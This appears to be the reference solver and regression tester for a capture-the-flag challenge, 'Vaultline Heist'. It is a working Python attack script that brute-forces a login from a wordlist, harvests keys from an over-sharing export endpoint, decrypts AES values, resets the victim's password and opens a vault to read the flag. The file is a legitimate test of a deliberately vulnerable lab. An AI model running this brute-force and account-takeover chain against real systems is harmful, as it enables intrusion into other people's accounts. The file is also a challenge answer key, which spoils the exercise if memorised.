"""
Vaultline Heist — reference solver / end-to-end tester.

Walks the whole attacker chain against a LIVE server over HTTP:

    brute-force login  ->  data export leak  ->  AES-256 decrypt
    ->  rotate password  ->  open vault  ->  read the flag

Usage:
    python tools/solve.py http://127.0.0.1:8000 <target_username> [password]

If a password is given it logs in directly; otherwise it brute-forces
tools/wordlist.txt to find it. Handy as a regression check for the full chain.
"""

import base64
import json
import os
import sys

import requests
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


def aes_decrypt(blob: str, secret: str) -> str:
    """Decrypt the encode-decode.com AES-256 scheme: key = secret zero-padded to
    32 bytes, IV = zeros, CBC, PKCS#7. Returns the plain value string."""
    key = secret.encode()[:32].ljust(32, b"\x00")
    ct = base64.b64decode(blob)
    dec = Cipher(algorithms.AES(key), modes.CBC(b"\x00" * 16)).decryptor()
    padded = dec.update(ct) + dec.finalize()
    unp = padding.PKCS7(algorithms.AES.block_size).unpadder()
    return (unp.update(padded) + unp.finalize()).decode()

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000").rstrip("/")
USERNAME = sys.argv[2] if len(sys.argv) > 2 else "abraham"
PASSWORD = sys.argv[3] if len(sys.argv) > 3 else None

s = requests.Session()
s.headers["Accept"] = "text/html"  # behave like a browser -> redirect + session


def csrf():
    return s.cookies.get("csrftoken", "")


# 1. Log in. With a browser Accept header, a correct password returns 302 and
#    sets the session; a wrong one re-renders the form (200). If no password was
#    supplied, brute-force the bundled wordlist to find it.
def portal_login(pw):
    r = s.post(f"{BASE}/portal/login/",
               data={"username": USERNAME, "password": pw}, allow_redirects=False)
    return r.status_code == 302

if PASSWORD:
    assert portal_login(PASSWORD), "[1] login failed with the given password"
    print(f"[1] Login                    -> OK (password: {PASSWORD})")
else:
    wordlist = os.path.join(os.path.dirname(__file__), "wordlist.txt")
    found = None
    with open(wordlist, encoding="latin-1", errors="ignore") as f:
        for line in f:
            pw = line.strip()
            if pw and portal_login(pw):
                found = pw
                break
    assert found, "[1] brute-force did not find the password (wrong wordlist?)"
    print(f"[1] Brute-force login        -> OK (password: {found})")

# 2. Over-sharing data export.
export = s.get(f"{BASE}/portal/profile/data/").json()
assert "vault_algorithm_key" in export and "encrypted_vault_password" in export, "[2] export missing fields"
print("[2] Data export leak        -> OK", list(export.keys()))


# 3. Decrypt the two AES-256 values (encode-decode.com scheme); id is plaintext.
password = aes_decrypt(export["encrypted_password"], export["algorithm_key"])
vault_id = export["vault_id"]
vault_password = aes_decrypt(export["encrypted_vault_password"], export["vault_algorithm_key"])
print(f"[3] AES-256 decrypt          -> OK password: {password} | vault: {vault_id} / {vault_password}")

# 4. Negative check: opening the vault before rotating must be gated (403).
s.get(f"{BASE}/portal/vault/")  # prime csrf cookie
r = s.post(f"{BASE}/portal/vault/",
           data={"vault_id": vault_id, "vault_password": vault_password},
           headers={"X-CSRFToken": csrf(), "Referer": BASE})
assert r.status_code == 403, f"[4] expected 403 before rotation, got {r.status_code}"
print("[4] Vault gated before rotate-> OK (403)")

# 5. Rotate the account password (unlocks the vault input).
s.get(f"{BASE}/portal/rotate/")
r = s.post(f"{BASE}/portal/rotate/",
           data={"new_password": "pwned1234", "confirm_password": "pwned1234"},
           headers={"X-CSRFToken": csrf(), "Referer": BASE}, allow_redirects=False)
assert r.status_code == 302, f"[5] rotate failed: {r.status_code}"
print("[5] Rotate password          -> OK")

# 6. Open the vault with the decrypted credentials.
s.get(f"{BASE}/portal/vault/")
r = s.post(f"{BASE}/portal/vault/",
           data={"vault_id": vault_id, "vault_password": vault_password},
           headers={"X-CSRFToken": csrf(), "Referer": BASE})
assert r.status_code == 200, f"[6] vault open failed: {r.status_code}"
print("[6] Open vault               -> OK")

# 7. The confidential file is fetched by the vault page (find it in the network
#    tab). Retrieve it and read the flag inside.
loot = s.get(f"{BASE}/portal/vault/loot/").text
flag = next(l.split("FLAG:")[1].strip() for l in loot.splitlines() if l.startswith("FLAG:"))
print("[7] Recovered flag           ->", flag)

# 8. Enter the flag on the vault page to capture (the win — not auto-detected).
s.get(f"{BASE}/portal/vault/")
r = s.post(f"{BASE}/portal/vault/",
           data={"flag": flag}, headers={"X-CSRFToken": csrf(), "Referer": BASE})
assert r.status_code == 200, f"[8] flag capture failed: {r.status_code}"
print("[8] Submit flag              -> OK (case captured)")

print("\nFULL CHAIN OK. Flag entered on the vault page — case captured.")
